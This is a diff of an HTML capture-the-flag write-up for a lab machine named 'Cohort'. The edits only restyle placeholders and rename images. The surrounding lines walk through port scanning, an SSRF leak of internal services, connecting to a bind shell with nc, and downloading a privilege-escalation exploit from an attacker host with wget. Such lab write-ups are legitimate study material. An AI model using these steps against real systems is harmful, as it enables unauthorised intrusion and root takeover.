@@ -47,7 +47,7 @@
         <div class="note-content">
           <h2>1. Reconnaissance</h2>
           <h3>Ports Scan</h3>
-          <pre><code>rustscan -a &lt;target-ip&gt; -- -sC -sV -T4 -oA nmap-result</code></pre>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -T4 -oA nmap-result</code></pre>
           <p><strong>Open Ports:</strong></p>
           <ul>
             <li><strong>22/tcp</strong> – SSH (OpenSSH 9.6p1)</li>
@@ -57,7 +57,7 @@
           <div class="callout info">
             <strong>💡 Info</strong>
             Make sure to register the hostname:
-            <pre><code>echo '&lt;target-ip&gt; cohort.htb' | sudo tee -a /etc/hosts</code></pre>
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> cohort.htb' | sudo tee -a /etc/hosts</code></pre>
           </div>
 
           <h3>Web Content Discovery</h3>
@@ -72,15 +72,15 @@
           <h3>Web Enumeration</h3>
           <p>Access the website using HTTPS. The main page shows a dashboard with a "Client Insights" feature.</p>
           <div class="note-image">
-            <img src="../src/images/cohort-1.png" alt="Cohort Main Page Dashboard" onclick="toggleZoom(this)">
+            <img src="../src/images/cohort-dashboard.png" alt="Cohort Main Page Dashboard" onclick="toggleZoom(this)">
           </div>
           <p>Navigating to <strong>Client Insights</strong> reveals a URL validation feature.</p>
           <div class="note-image">
-            <img src="../src/images/cohort-2.png" alt="Client Insights URL Validation" onclick="toggleZoom(this)">
+            <img src="../src/images/cohort-client-insights.png" alt="Client Insights URL Validation" onclick="toggleZoom(this)">
           </div>
           <p>Testing various URLs confirmed it is vulnerable to <strong>SSRF</strong>. By using the discovered <code>/status</code> endpoint (which returned a 403 earlier) as a JSON payload in the Source URL input, the server responded.</p>
           <div class="note-image">
-            <img src="../src/images/cohort-3.png" alt="SSRF Response Leaking Internal Info" onclick="toggleZoom(this)">
+            <img src="../src/images/cohort-ssrf-leak.png" alt="SSRF Response Leaking Internal Info" onclick="toggleZoom(this)">
           </div>
           <div class="callout warning">
             <strong>⚠️ Critical Information Leaked</strong>
@@ -94,13 +94,13 @@
           <div class="callout info">
             <strong>💡 Info</strong>
             Add the new virtual host to your <code>/etc/hosts</code>:
-            <pre><code>echo '&lt;target-ip&gt; nb-1be3782a8afd3ad5.cohort.htb' | sudo tee -a /etc/hosts</code></pre>
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> nb-1be3782a8afd3ad5.cohort.htb' | sudo tee -a /etc/hosts</code></pre>
           </div>
 
           <h3>API Enumeration</h3>
           <p>Fuzzing the leaked internal API (<code>http://127.0.0.1:5000</code>) and the Notebook service (<code>http://127.0.0.1:8888</code>) revealed the API version.</p>
           <div class="note-image">
-            <img src="../src/images/cohort-4.png" alt="API Version Disclosure" onclick="toggleZoom(this)">
+            <img src="../src/images/cohort-api-version.png" alt="API Version Disclosure" onclick="toggleZoom(this)">
           </div>
           <div class="callout warning">
             <strong>⚠️ API Version Disclosure</strong>
@@ -139,8 +139,8 @@ print("[+] Done. Now connect to the target's port 4444.")</code></pre>
           <div class="callout info">
             <strong>📌 Prerequisites</strong>
             Run this in a Python virtual environment to avoid dependency conflicts:
-            <pre><code>python3 -m venv &lt;env-name&gt;
-source /path/to/&lt;env-name&gt;/bin/activate
+            <pre><code>python3 -m venv <span class="ph">&lt;env-name&gt;</span>
+source /path/to/<span class="ph">&lt;env-name&gt;</span>/bin/activate
 pip install websocket
 pip install --upgrade websocket-client</code></pre>
           </div>
@@ -150,7 +150,7 @@ pip install --upgrade websocket-client</code></pre>
 # [+] Bind shell payload sent. Waiting 3 seconds...
 # [+] Done. Now connect to the target's port 4444.</code></pre>
           <p>Connect to the bind shell:</p>
-          <pre><code>nc &lt;target-ip&gt; 4444
+          <pre><code>nc <span class="ph">&lt;target-ip&gt;</span> 4444
 $ id
 uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)</code></pre>
 
@@ -172,7 +172,7 @@ uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)</code></pre>
 cd Pack2TheRoot
 python3 -m http.server</code></pre>
           <p><strong>On target machine (as <code>marimo</code>):</strong></p>
-          <pre><code>wget http://&lt;attacker-ip&gt;:8000/exploit.py
+          <pre><code>wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py
 python3 exploit.py
 
 $ id
